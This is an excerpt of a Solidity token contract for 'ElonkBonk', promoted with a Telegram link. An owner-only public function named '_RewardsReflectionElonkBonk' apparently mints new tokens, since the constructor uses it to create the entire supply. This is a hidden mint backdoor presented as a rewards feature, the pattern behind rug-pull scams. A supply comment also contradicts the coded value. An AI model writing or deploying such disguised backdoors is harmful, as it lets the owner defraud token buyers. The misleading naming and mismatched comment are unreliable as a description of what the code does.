...
//
// $ElonkBonk proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/EloonBonkBSC
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _RewardsReflectionElonkBonk(uint256 amount) public onlyOwner {
    _RewardsReflectionElonkBonk(msg.sender, amount);
    }
    ...
    function _RewardsReflectionElonkBonk(address account, uint256 amount) internal virtual {
...
contract ElonkBonk is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ElonkBonk ", "ElonkBonk") {
        _RewardsReflectionElonkBonk(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}